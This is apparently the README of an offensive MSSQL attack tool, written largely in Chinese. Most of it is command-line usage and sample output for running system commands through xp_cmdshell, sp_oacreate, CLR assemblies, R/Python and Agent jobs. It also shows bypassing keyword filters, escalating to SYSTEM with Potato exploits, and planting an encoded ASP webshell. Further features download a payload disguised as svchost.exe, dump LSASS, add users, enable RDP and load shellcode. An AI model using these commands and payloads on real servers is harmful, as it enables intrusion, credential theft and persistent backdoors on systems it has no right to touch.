# mssql-command-tool


wolvez老哥写的第一版代码
链接：[http://wolvez.club/2019/09/19/mssql-command-tool/](http://wolvez.club/2019/09/19/mssql-command-tool/)
感谢老哥分享

dll文件代码:`https://github.com/uknowsec/SharpSQLTools/blob/master/SharpSQLTools/Setting.cs`
dll文件代码:`https://github.com/Ridter/MSSQL_CLR`

示例：
```
NAME:
   Mssql Toolkit - mssql command tool

USAGE:
   mssql-command-tools_Windows_64.exe [global options] command [command options] [arguments...]

AUTHOR:
   Microsoft.com clr参考: https://github.com/uknowsec/SharpSQLTools/

COMMANDS:
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --server value, --host value, -s value  The database server (default: "127.0.0.1")
   --user value, -u value                  The database user (default: "sa")
   --password value, -p value              The database password
   --database value, -d value              The database name (default: "msdb")
   --port value, -P value                  The database port (default: 1433)
   --option value                          -xcmd, -X powershell (default: "whoami")
   --query value, -q value, --sql value    SQL query (default: "select @@version")
   --cmd value, -c value, --exec value     Exec System Command | xp_cmdshell命令执行 (default: "whoami")
   --cmd1 value, --c1 value                Exec System Command | sp_oacreate无回显执行 (default: "whoami >C:\\whoami.log")
   --cmd2 value, --c2 value                Exec System Command | sp_oacreate有回显执行 | wscript.shell (default: "whoami")
   --cmdsp value                           Exec System Command | sp_oacreate有回显执行 | {72C24DD5-D70A-438B-8A42-98424B88AFB8} (default: "whoami")
   --cmd3 value, --c3 value                Exec System Command | clr执行 | clr命令参考: https://github.com/uknowsec/SharpSQLTools/ (default: "clr_exec whoami")
   --cmdpy value                           Exec System Command | clr执行 | clr命令参考: https://github.com/Ridter/PySQLTools (default: "clr_exec whoami")
   --cmd4 value, --c4 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd5 value, --c5 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd6 value, --c6 value                Exec System Command | xp_cmdshell命令执行|过滤了xp_cmdshell等关键字提交方法语句 (default: "-c6 whoami")
   --cmd7 value, --c7 value                Exec System Command | 自写clr执行 (default: "-c7 whoami")
   --cmd8 value, --c8 value                Exec System Command | r language command (default: "-c8 whoami")
   --cmd9 value, --c9 value                Exec System Command | python language command (default: "-c9 whoami")
   --cmd10 value, --c10 value              Exec System Command | createAndStartJob command (default: "-c10 whoami >c:\\windows\\temp\\123.txt")
   --cmd11 value, --c11 value              Exec System Command | 自写clr执行 | --option -x --cmd11 cmd | --option -X --cmd11 powershell (default: "--option -x --cmd11 cmd")
   --dir value, --dirtree value            xp_dirtree列目录 | dir c:
   --path value                            网站路径 -path + -code | c:\inetpub\wwwroot\cmd.asp (default: "c:\\inetpub\\wwwroot\\cmd.asp")
   --local value                           本地路径 localFile (default: "c:\\1.txt")
   --remote value                          远程路径 remoteFile (default: "C:\\Windows\\Temp\\1.txt")
   --code value                            -path + -code | 如果代码有"就加\来匹配<%eval request("cmd")%>网站路径和asp密码默认:LandGrey (default: "<%@codepage=65000%><%@codepage=65000%><%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%>")
   --downurl value                         下载文件的url地址 | http://www.microsoft.com/defender.exe
   --filepath value                        下载文件的路径 | c:\programdata\svchost.exe
   --debug                                 Debug info
   --enable, -e                            Enabled xp_cmdshell
   --disable, --diclose                    Disable xp_cmdshell
   --ole, --oleopen                        Enabled sp_oacreate
   --dole, --dolose                        Disable sp_oacreate
   --clr, --clropen                        Enabled clr enabled
   --dclr, --dclose                        Disable clr enabled
   --rlce, --rlceopen                      r|python languag eenabled
   --jobopen                               MSSQL Agent Job服务开启
   --install_clr, --in_clr                 install clr  | --cmd3 "clr_exec whoami" | clr命令参考: https://github.com/uknowsec/SharpSQLTools/
   --uninstall_clr, --un_clr               uninstall clr | --cmd3 "clr_exec whoami"
   --installpy_clr, --inpy_clr             installpy clr  | --cmdpy "clr_exec whoami" | clr命令参考: https://github.com/Ridter/PySQLTools
   --uninstallpy_clr, --unpy_clr           uninstallpy clr | --cmdpy "clr_exec whoami"
   --install_clrcmd, --in_clrcmd           install clrcmd | "--c4 net --c5 user"
   --uninstall_clrcmd, --un_clrcmd         uninstall clrcmd | "--c4 net --c5 user"
   --install_clrcmd1, --in_clrcmd1         install clrcmd1 | --cmd7 "whoami"
   --uninstall_clrcmd1, --un_clrcmd1       uninstall clrcmd | --cmd7 "whoami"
   --install_clrcmd2, --in_clrcmd2         install clrcmd2 | --cmd11 "whoami"
   --uninstall_clrcmd2, --un_clrcmd2       uninstall clrcmd2 | --cmd11 "whoami"
   --upload                                --upload --local c:\svchost.exe --remote C:\Windows\Temp\svchost.exe
   --help, -h                              show help
```
##### 帮助

```
开启xp_cmdshell组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --enable/--e

开启sp_oacreate组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --ole/--o

开启ole组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin -clr

xp_cmdshell 执行
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd "whoami"
nt service\mssqlserver

绕过过滤xp_cmdshell关键字
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd6 "whoami"
nt service\mssqlserver

sp_oacreate 执行 略微不一样，但大致一样
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd2 "whoami" 
nt service\mssqlserver

mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdsp "whoami" 
nt service\mssqlserver

安装SharpSQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --install_clr
Clrcmd Install SharpSQLTools CLR Success.

执行命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_exec whoami"
mssql: [+] Process: cmd.exe
mssql: [+] arguments:  /c whoami
mssql: [+] RunCommand: cmd.exe  /c whoami
mssql:
mssql: nt service\mssqlserver

提权
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_badpotato whoami" 
mssql: [*] CreateNamedPipeW Success! IntPtr:4048
mssql: [*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1816351484896
mssql: [*] ConnectNamePipe Success!
mssql: [*] CurrentUserName : MSSQLSERVER
mssql: [*] CurrentConnectPipeUserName : SYSTEM
mssql: [*] ImpersonateNamedPipeClient Success!
mssql: [*] OpenThreadToken Success! IntPtr:6840
mssql: [*] DuplicateTokenEx Success! IntPtr:6556
mssql: [*] SetThreadToken Success!
mssql: [*] CreateOutReadPipe Success! out_read:5536 out_write:5528
mssql: [*] CreateErrReadPipe Success! err_read:3436 err_write:5072
mssql: [*] CreateProcessWithTokenW Success! ProcessPid:9608
mssql: nt authority\system
卸载SharpSQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstall_clr
Uninstall SharpSQLTools CLR Success.

安装PySQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --installpy_clr
Clrcmd Install PySQLTools Clr Success.

执行命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdpy "clr_exec whoami" 
mssql: [+] Successfully unhooked ETW!
mssql: [*] No dll to patch
mssql: [+] Process: cmd.exe
mssql: [+] arguments:  /c whoami
mssql: [+] RunCommand: cmd.exe  /c whoami
mssql:

mssql: nt service\mssqlserver

提权


卸载PySQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstallpy_clr
Uninstall PySQLTools Clr Success.


mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd4 net -cmd5 user
\\ 的用户帐户

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
命令运行完毕，但发生一个或多个错误。


mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd7 "whoami"   
mssql: Command is running, please wait.
mssql: nt service\mssqlserver


mssql: nt service\mssqlserver

r language command (default: "-c8 whoami")
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd8 "whoami" 
nt service\mssqllaunchpad

python language command (default: "-c9 whoami")
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd9 "whoami"
nt service\mssqllaunchpad

执行CreateAndStartJob
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd10 "whoami >c:\\programdata\\test.txt"
CreateAndStartJob Command Success!

当权限不足的时候
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_efspotato net start SQLSERVERAGENT"

列目录
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
subdirectory    depth   file
123.dll
Application Data
Documents
Huorong
Microsoft
MSSQLSERVER
Package Cache
regid.1991-06.com.microsoft
SoftwareDistribution
SSISTelemetry
Templates
test.txt
USOPrivate
USOShared
VMware
「开始」菜单
桌面

Command List Dir Success.

-x cmd命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -x --cmd11 "whoami"
[]
nt service\mssqlserver


-X powershell命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -X --cmd11 "Get-Process explorer"
[]

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   2296     113    71352     183772              1304   1 explorer

上传文件
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --upload --local c:\Database.dll --remote C:\programdata\Database.dll 
[*] Uploading 'c:\Database.dll' to 'C:\programdata\Database.dll'...
[!] C:\programdata\Database.dll Upload Success

mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
subdirectory    depth   file
123.dll
Application Data
Database.dll
```

#### SharpSQLTools
```
clr_pwd                    - print current directory by clr
clr_ls {directory}         - list files by clr
clr_cd {directory}         - change directory by clr
clr_ps                     - list process by clr
clr_netstat                - netstat by clr
clr_ping {host}            - ping by clr
clr_cat {file}             - view file contents by clr
clr_rm {file}              - delete file by clr
clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
clr_badpotato {cmd}        - exec by BadPotato like clr_exec
clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
clr_dumplsass {path}       - dumplsass by clr
clr_rdp                    - check RDP port and Enable RDP
clr_getav                  - get anti-virus software on this machin by clr
clr_adduser {user} {pass}  - add user by clr
clr_download {url} {path}  - download file from url by clr
clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
clr_scloader1 {file} {key} - Encrypt Shellcode by Encrypt.py and Upload Payload.txt
clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader
```

#### PySQLTools
```
clr_pwd                       - print current directory by clr
clr_ls {directory}            - list files by clr
clr_cd {directory}            - change directory by clr
clr_ps                        - list process by clr
clr_netstat                   - netstat by clr
clr_ping {host}               - ping by clr
clr_cat {file}                - view file contents by clr
clr_rm {file}                 - delete file by clr
clr_exec {cmd}                - for example: clr_exec whoami;clr_exec -p c:.exe;clr_exec -p c:\cmd.exe -a /c whoami
clr_efspotato {cmd}           - exec by EfsPotato like clr_exec
clr_badpotato {cmd}           - exec by BadPotato like clr_exec
clr_godpotato {cmd}           - exec by GodPotato like clr_exec
clr_combine {remotefile}      - When the upload module cannot call CMD to perform copy to merge files
clr_dumplsass {path}          - dumplsass by clr
clr_rdp                       - check RDP port and Enable RDP
clr_getav                     - get anti-virus software on this machin by clr
clr_adduser {user} {pass}     - add user by clr
clr_download {url} {path}     - download file from url by clr
clr_scloader {shellcode}      - shellcode.bin
clr_assembly {prog} {args}    - execute-assembly.
clr_assembly_sc {shellcode}   - assembly shellcode created by donut.
```

#### References
```
https://github.com/Ridter/PySQLTools
https://github.com/uknowsec/SharpSQLTools
https://github.com/Ridter/MSSQL_CLR
https://github.com/JKme/cube/blob/master/core/sqlcmdmodule/mssql3.go
https://quan9i.top/post/SQL%20Server%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/
```

